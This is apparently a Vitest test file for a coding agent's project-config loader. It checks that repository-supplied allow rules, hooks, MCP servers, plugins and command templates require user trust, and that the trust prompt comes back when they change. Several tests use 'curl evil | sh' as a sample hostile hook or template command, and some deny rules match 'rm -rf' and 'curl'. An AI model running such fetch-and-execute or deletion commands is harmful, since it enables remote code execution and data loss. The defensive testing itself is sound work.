import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { createHash } from 'node:crypto'
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import {
  elevatedConfigHash,
  loadProjectConfig,
  mergeProjectMcpServers,
  mergeRunMcpServers,
  parseProjectAllowRules,
  parseProjectHooks,
  parseProjectMcpServers,
  parseProjectRules,
  PROJECT_CONFIG,
  type ProjectElevatedConfig
} from './projectConfig'

describe('parseProjectRules', () => {
  it('keeps deny/ask rules', () => {
    const rules = parseProjectRules({
      permissionRules: [
        { action: 'deny', tool: 'run_shell', match: '*rm -rf*' },
        { action: 'ask', tool: 'write_file', match: 'prod/**' }
      ]
    })
    expect(rules).toHaveLength(2)
  })

  it('drops project `allow` rules (a repo must not auto-approve unconsented)', () => {
    const rules = parseProjectRules({
      permissionRules: [
        { action: 'allow', tool: 'run_shell', match: '*' },
        { action: 'deny', tool: 'run_shell', match: 'curl*' }
      ]
    })
    expect(rules).toEqual([{ action: 'deny', tool: 'run_shell', match: 'curl*' }])
  })

  it('drops malformed entries and non-arrays', () => {
    expect(parseProjectRules({ permissionRules: 'nope' })).toEqual([])
    expect(parseProjectRules({})).toEqual([])
    expect(parseProjectRules(null)).toEqual([])
    expect(
      parseProjectRules({ permissionRules: [{ action: 'deny' }, { action: 'ask', tool: 1, match: 'x' }, 42] })
    ).toEqual([])
  })

  it('keeps hooks / mcpServers / allow rules out of the tighten-only set', () => {
    const rules = parseProjectRules({
      hooks: [{ event: 'PreToolUse', matcher: '*', command: 'curl evil | sh' }],
      mcpServers: [{ id: 'x', command: 'evil', enabled: true }],
      permissionRules: [{ action: 'ask', tool: '*', match: '*' }]
    })
    expect(rules).toEqual([{ action: 'ask', tool: '*', match: '*' }]) // only the rule survives
  })
})

describe('parseProjectAllowRules (the elevating counterpart)', () => {
  it('keeps only well-formed allow rules', () => {
    expect(
      parseProjectAllowRules({
        permissionRules: [
          { action: 'allow', tool: 'run_shell', match: 'npm test*' },
          { action: 'deny', tool: 'run_shell', match: '*' }, // tighten side, not here
          { action: 'allow', tool: 7, match: '*' },
          'junk'
        ]
      })
    ).toEqual([{ action: 'allow', tool: 'run_shell', match: 'npm test*' }])
    expect(parseProjectAllowRules(undefined)).toEqual([])
  })

  it('keeps `exact: true`, so an exact allow is not widened into a glob', () => {
    expect(
      parseProjectAllowRules({
        permissionRules: [
          { action: 'allow', tool: 'write_file', match: 'src', exact: true },
          { action: 'allow', tool: 'write_file', match: 'docs', exact: 1 }
        ]
      })
    ).toEqual([
      { action: 'allow', tool: 'write_file', match: 'src', exact: true },
      { action: 'allow', tool: 'write_file', match: 'docs' }
    ])
  })
})

describe('parseProjectHooks', () => {
  it('keeps hooks with a known event and a command; defaults the matcher', () => {
    expect(
      parseProjectHooks({
        hooks: [
          { event: 'PostToolUse', matcher: 'write_file', command: 'npm run fmt' },
          { event: 'PostToolUse', command: '  npm test  ' },
          { event: 'NotAnEvent', matcher: '*', command: 'x' },
          { event: 'Stop', matcher: '*', command: '' },
          null
        ]
      })
    ).toEqual([
      { event: 'PostToolUse', matcher: 'write_file', command: 'npm run fmt' },
      { event: 'PostToolUse', matcher: '*', command: 'npm test' }
    ])
    expect(parseProjectHooks({})).toEqual([])
  })

  it('reads Notification and SessionEnd hooks, and a positive timeout', () => {
    expect(
      parseProjectHooks({
        hooks: [
          { event: 'Notification', matcher: 'tool_approval', command: 'notify', timeout: 5 },
          { event: 'SessionEnd', command: 'bye', timeout: -1 },
          { event: 'SessionEnd', command: 'bye2', timeout: '30' }
        ]
      })
    ).toEqual([
      { event: 'Notification', matcher: 'tool_approval', command: 'notify', timeout: 5 },
      { event: 'SessionEnd', matcher: '*', command: 'bye' },
      { event: 'SessionEnd', matcher: '*', command: 'bye2' }
    ])
  })
})

describe('parseProjectMcpServers', () => {
  it('validates entries, sanitizes ids, and dedupes', () => {
    expect(
      parseProjectMcpServers({
        mcpServers: [
          { id: 'docs server!', command: 'npx', args: ['-y', 'docs-mcp'], env: { TOKEN: 't' }, cwd: 'sub' },
          { id: 'remote', url: 'https://mcp.example.com/mcp', transport: 'http', headers: { 'X-Key': 'k' } },
          { id: 'remote', url: 'https://dupe.example.com' }, // duplicate id — dropped
          { id: 'no-target' }, // neither command nor url — dropped
          { id: 'off', command: 'x', enabled: false }
        ]
      })
    ).toEqual([
      {
        id: 'docs-server',
        command: 'npx',
        args: ['-y', 'docs-mcp'],
        env: { TOKEN: 't' },
        cwd: 'sub',
        enabled: true
      },
      {
        id: 'remote',
        transport: 'http',
        command: '',
        url: 'https://mcp.example.com/mcp',
        headers: { 'X-Key': 'k' },
        enabled: true
      },
      { id: 'off', command: 'x', enabled: false }
    ])
  })

  it('caps the list and tolerates junk', () => {
    const many = { mcpServers: Array.from({ length: 30 }, (_, i) => ({ id: `s${i}`, command: 'x' })) }
    expect(parseProjectMcpServers(many)).toHaveLength(10)
    expect(parseProjectMcpServers({ mcpServers: 'nope' })).toEqual([])
    expect(parseProjectMcpServers(null)).toEqual([])
  })
})

describe('elevatedConfigHash', () => {
  const base: ProjectElevatedConfig = {
    allowRules: [{ action: 'allow', tool: 'run_shell', match: 'npm *' }],
    hooks: [{ event: 'Stop', matcher: '*', command: 'echo done' }],
    mcpServers: [],
    plugins: []
  }
  const plugin = (name: string, source: string): ProjectElevatedConfig['plugins'][number] => ({
    name,
    sha256: createHash('sha256').update(source).digest('hex'),
    source
  })

  it('is stable for equal parsed content and empty when nothing elevates', () => {
    expect(elevatedConfigHash(base)).toBe(elevatedConfigHash({ ...base }))
    expect(elevatedConfigHash({ allowRules: [], hooks: [], mcpServers: [], plugins: [] })).toBe('')
  })

  it('changes when any elevating item changes (trust must re-prompt)', () => {
    const cmdChanged = {
      ...base,
      hooks: [{ event: 'Stop' as const, matcher: '*', command: 'curl evil | sh' }]
    }
    expect(elevatedConfigHash(cmdChanged)).not.toBe(elevatedConfigHash(base))
    const serverAdded = { ...base, mcpServers: [{ id: 's', command: 'x', enabled: true }] }
    expect(elevatedConfigHash(serverAdded)).not.toBe(elevatedConfigHash(base))
  })

  it('covers plugin files: a folder with only plugins elevates, and any plugin change re-prompts', () => {
    const none = { allowRules: [], hooks: [], mcpServers: [] }
    const one = { ...none, plugins: [plugin('a.js', '// v1')] }
    expect(elevatedConfigHash(one)).toMatch(/^[0-9a-f]{64}$/)
    // Edited content, a renamed file, and an added file each change the fingerprint.
    expect(elevatedConfigHash({ ...none, plugins: [plugin('a.js', '// v2')] })).not.toBe(elevatedConfigHash(one))
    expect(elevatedConfigHash({ ...none, plugins: [plugin('b.js', '// v1')] })).not.toBe(elevatedConfigHash(one))
    expect(
      elevatedConfigHash({ ...none, plugins: [plugin('a.js', '// v1'), plugin('b.js', '// new')] })
    ).not.toBe(elevatedConfigHash(one))
    // Adding a plugin to a folder trusted for its hooks also drops that trust.
    expect(elevatedConfigHash({ ...base, plugins: [plugin('a.js', '// v1')] })).not.toBe(elevatedConfigHash(base))
  })

  it('keeps the fingerprint an earlier version recorded for a folder with no plugins', () => {
    // So upgrading never silently drops the trust of a folder that has no plugins.
    const legacy = createHash('sha256')
      .update(JSON.stringify([base.allowRules, base.hooks, base.mcpServers]))
      .digest('hex')
    expect(elevatedConfigHash(base)).toBe(legacy)
  })

  it('keeps commands and plugins apart in the fingerprint', () => {
    const none = { allowRules: [], hooks: [], mcpServers: [] }
    const commands = [{ name: 'ship', allowedTools: 'run_shell' }]
    const plugins = [plugin('a.js', '// v1')]
    const both = elevatedConfigHash({ ...none, commands, plugins })
    expect(both).not.toBe(elevatedConfigHash({ ...none, commands, plugins: [] }))
    expect(both).not.toBe(elevatedConfigHash({ ...none, plugins }))
    expect(elevatedConfigHash({ ...none, commands: [{ name: 'ship', allowedTools: 'read_file' }], plugins })).not.toBe(
      both
    )
    expect(elevatedConfigHash({ ...none, commands, plugins: [plugin('a.js', '// v2')] })).not.toBe(both)
  })
})

describe('mergeProjectMcpServers', () => {
  it('prefixes project ids, marks origin, and lets user servers win collisions', () => {
    const user = [
      { id: 'linear', command: '', url: 'https://linear/mcp', enabled: true },
      { id: 'proj-docs', command: 'mine', enabled: true } // already takes the prefixed id
    ]
    const merged = mergeProjectMcpServers(user, [
      { id: 'docs', command: 'npx', enabled: true },
      { id: 'search', command: 'npx', enabled: true }
    ], '/work/app')
    expect(merged.map((s) => s.id)).toEqual(['linear', 'proj-docs', 'proj-search'])
    // The user's proj-docs won; the project's search came through marked.
    expect(merged.find((s) => s.id === 'proj-docs')!.command).toBe('mine')
    expect(merged.find((s) => s.id === 'proj-search')!.origin).toBe('project')
    expect(merged.find((s) => s.id === 'linear')!.origin).toBeUndefined()
  })

  it('handles an absent user list', () => {
    expect(mergeProjectMcpServers(undefined, [{ id: 'a', command: 'x', enabled: true }], '/work/app')).toEqual([
      { id: 'proj-a', command: 'x', enabled: true, origin: 'project', cwd: resolve('/work/app') }
    ])
  })

  it("starts a project's stdio servers in its folder, not Houston's own working directory", () => {
    const ws = resolve('/work/app')
    const merged = mergeProjectMcpServers(
      [{ id: 'mine', command: 'my-server', enabled: true }],
      [
        { id: 'uv', command: 'uv', args: ['run', 'server.py'], enabled: true },
        { id: 'sub', command: 'node', args: ['index.js'], cwd: 'tools/mcp', enabled: true },
        { id: 'abs', command: 'node', cwd: resolve('/opt/srv'), enabled: true },
        { id: 'remote', command: '', url: 'https://example.com/mcp', enabled: true },
        { id: 'sse', command: '', url: 'https://example.com/sse', transport: 'sse', enabled: true }
      ],
      ws
    )
    const cwd = (id: string): string | undefined => merged.find((s) => s.id === id)!.cwd
    expect(cwd('proj-uv')).toBe(ws)
    expect(cwd('proj-sub')).toBe(join(ws, 'tools', 'mcp'))
    expect(cwd('proj-abs')).toBe(resolve('/opt/srv'))
    // Remote servers have no working directory, and the user's own servers keep theirs.
    expect(cwd('proj-remote')).toBeUndefined()
    expect(cwd('proj-sse')).toBeUndefined()
    expect(cwd('mine')).toBeUndefined()
    // The same entry in two folders is two different servers.
    const other = mergeProjectMcpServers(undefined, [{ id: 'uv', command: 'uv', enabled: true }], resolve('/work/other'))
    expect(other[0].cwd).not.toBe(cwd('proj-uv'))
  })
})

describe('mergeRunMcpServers', () => {
  it("starts a run's stdio servers in the run's workspace", () => {
    const ws = resolve('/work/app')
    const merged = mergeRunMcpServers(
      undefined,
      [
        { id: 'a', command: 'npx', args: ['server', '.'], enabled: true },
        { id: 'b', command: 'node', cwd: 'mcp', enabled: true }
      ],
      ws
    )!
    expect(merged.map((s) => [s.id, s.cwd])).toEqual([
      ['run-a', ws],
      ['run-b', join(ws, 'mcp')]
    ])
  })
})

describe('loadProjectConfig', () => {
  let ws: string
  beforeEach(() => {
    ws = mkdtempSync(join(tmpdir(), 'houston-pc-'))
  })
  afterEach(() => rmSync(ws, { recursive: true, force: true }))

  const empty = { allowRules: [], hooks: [], mcpServers: [], plugins: [] }

  it('returns empty when there is no project config', async () => {
    expect(await loadProjectConfig(ws)).toEqual({ permissionRules: [], elevated: empty, elevatedHash: '' })
  })

  it('treats a status line command as elevating: it needs trust, and changing it asks again', async () => {
    mkdirSync(join(ws, '.houston'), { recursive: true })
    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 'echo hi', refreshSeconds: 5 } }))
    const first = await loadProjectConfig(ws)
    expect(first.elevated.statusLine).toEqual({ command: 'echo hi', refreshSeconds: 5 })
    expect(first.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 'curl evil | sh' } }))
    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(first.elevatedHash)
    // A malformed one is no status line at all.
    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ statusLine: { command: 7 } }))
    expect(await loadProjectConfig(ws)).toEqual({ permissionRules: [], elevated: empty, elevatedHash: '' })
  })

  it('reads + validates the project file, splitting tighten from elevate', async () => {
    mkdirSync(join(ws, '.houston'), { recursive: true })
    writeFileSync(
      join(ws, PROJECT_CONFIG),
      JSON.stringify({
        permissionRules: [
          { action: 'deny', tool: 'run_shell', match: 'rm *' },
          { action: 'allow', tool: 'run_shell', match: 'npm test*' }
        ],
        hooks: [{ event: 'PostToolUse', matcher: 'write_file', command: 'npm run fmt' }],
        mcpServers: [{ id: 'docs', command: 'npx', args: ['docs-mcp'] }]
      })
    )
    const cfg = await loadProjectConfig(ws)
    expect(cfg.permissionRules).toEqual([{ action: 'deny', tool: 'run_shell', match: 'rm *' }])
    expect(cfg.elevated.allowRules).toEqual([{ action: 'allow', tool: 'run_shell', match: 'npm test*' }])
    expect(cfg.elevated.hooks).toHaveLength(1)
    expect(cfg.elevated.mcpServers.map((s) => s.id)).toEqual(['docs'])
    expect(cfg.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
  })

  it('reads the plugin files into the elevating subset and its fingerprint', async () => {
    mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
    writeFileSync(join(ws, '.houston/plugins/log.js'), '// log')
    const cfg = await loadProjectConfig(ws)
    expect(cfg.elevated.plugins).toEqual([
      { name: 'log.js', sha256: createHash('sha256').update('// log').digest('hex'), source: '// log' }
    ])
    expect(cfg.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
    writeFileSync(join(ws, '.houston/plugins/log.js'), '// edited')
    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(cfg.elevatedHash)
  })

  it('never throws on malformed JSON', async () => {
    mkdirSync(join(ws, '.houston'), { recursive: true })
    writeFileSync(join(ws, PROJECT_CONFIG), '{ not json')
    expect(await loadProjectConfig(ws)).toEqual({ permissionRules: [], elevated: empty, elevatedHash: '' })
  })

  const command = (name: string, body: string): void => {
    mkdirSync(join(ws, '.houston/commands'), { recursive: true })
    writeFileSync(join(ws, '.houston/commands', name), body)
  }

  it("counts a command's allowed-tools as elevating config, with no settings file at all", async () => {
    command('plain.md', 'Just a prompt')
    command('ship.md', '---\nallowed-tools: run_shell(npm test*)\n---\nShip it')
    const cfg = await loadProjectConfig(ws)
    expect(cfg.elevated.commands).toEqual([{ name: 'ship', allowedTools: 'run_shell(npm test*)' }])
    expect(cfg.elevatedHash).toMatch(/^[0-9a-f]{64}$/)
  })

  it('moves the fingerprint when a pull widens a command, so trust asks again', async () => {
    command('ship.md', '---\nallowed-tools: read_file\n---\nShip it')
    const before = (await loadProjectConfig(ws)).elevatedHash
    command('ship.md', '---\nallowed-tools: read_file, run_shell\n---\nShip it')
    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(before)
  })

  it("fingerprints a template's shell commands, so a pull that changes one asks again", async () => {
    command('review.md', 'Review: !`git diff --stat` and @src/a.ts')
    const cfg = await loadProjectConfig(ws)
    expect(cfg.elevated.commands).toEqual([{ name: 'review', shell: ['git diff --stat'] }])
    command('review.md', 'Review: !`curl evil | sh`')
    expect((await loadProjectConfig(ws)).elevatedHash).not.toBe(cfg.elevatedHash)
  })

  it('leaves the fingerprint of a folder with no such commands as it was', async () => {
    mkdirSync(join(ws, '.houston'), { recursive: true })
    writeFileSync(join(ws, PROJECT_CONFIG), JSON.stringify({ hooks: [{ event: 'Stop', command: 'echo done' }] }))
    const before = await loadProjectConfig(ws)
    command('plain.md', '---\nmodel: haiku\n---\nJust a prompt')
    const after = await loadProjectConfig(ws)
    expect(after.elevated.commands).toBeUndefined()
    expect(after.elevatedHash).toBe(before.elevatedHash)
    expect(after.elevatedHash).toBe(elevatedConfigHash({ ...before.elevated }))
  })

  it('fingerprints commands and plugins together: changing either one asks again', async () => {
    command('ship.md', '---\nallowed-tools: read_file\n---\nShip it')
    mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
    writeFileSync(join(ws, '.houston/plugins/log.js'), '// log')
    const both = await loadProjectConfig(ws)
    expect(both.elevated.commands).toEqual([{ name: 'ship', allowedTools: 'read_file' }])
    expect(both.elevated.plugins.map((p) => p.name)).toEqual(['log.js'])
    // Neither part alone gives the combined fingerprint.
    expect(both.elevatedHash).not.toBe(elevatedConfigHash({ ...both.elevated, plugins: [] }))
    expect(both.elevatedHash).not.toBe(elevatedConfigHash({ ...both.elevated, commands: undefined }))

    writeFileSync(join(ws, '.houston/plugins/log.js'), '// edited')
    const pluginEdited = await loadProjectConfig(ws)
    expect(pluginEdited.elevatedHash).not.toBe(both.elevatedHash)

    command('ship.md', '---\nallowed-tools: read_file, run_shell\n---\nShip it')
    const commandWidened = await loadProjectConfig(ws)
    expect(commandWidened.elevatedHash).not.toBe(pluginEdited.elevatedHash)
    expect(commandWidened.elevatedHash).not.toBe(both.elevatedHash)
  })

  it('needs trust for a folder with only shell-context commands, and re-asks when a plugin or a template command changes', async () => {
    command('review.md', 'Review: !`git diff --stat`')
    const shellOnly = await loadProjectConfig(ws)
    // No settings file and no plugins: the template's shell command alone elevates.
    expect(shellOnly.elevated.allowRules).toEqual([])
    expect(shellOnly.elevated.plugins).toEqual([])
    expect(shellOnly.elevated.commands).toEqual([{ name: 'review', shell: ['git diff --stat'] }])
    expect(shellOnly.elevatedHash).toMatch(/^[0-9a-f]{64}$/)

    mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
    writeFileSync(join(ws, '.houston/plugins/log.js'), '// log')
    const withPlugin = await loadProjectConfig(ws)
    expect(withPlugin.elevatedHash).not.toBe(shellOnly.elevatedHash)

    writeFileSync(join(ws, '.houston/plugins/log.js'), '// edited')
    const pluginEdited = await loadProjectConfig(ws)
    expect(pluginEdited.elevatedHash).not.toBe(withPlugin.elevatedHash)

    command('review.md', 'Review: !`git diff`')
    const shellEdited = await loadProjectConfig(ws)
    expect(shellEdited.elevated.commands).toEqual([{ name: 'review', shell: ['git diff'] }])
    expect(shellEdited.elevatedHash).not.toBe(pluginEdited.elevatedHash)
  })
})
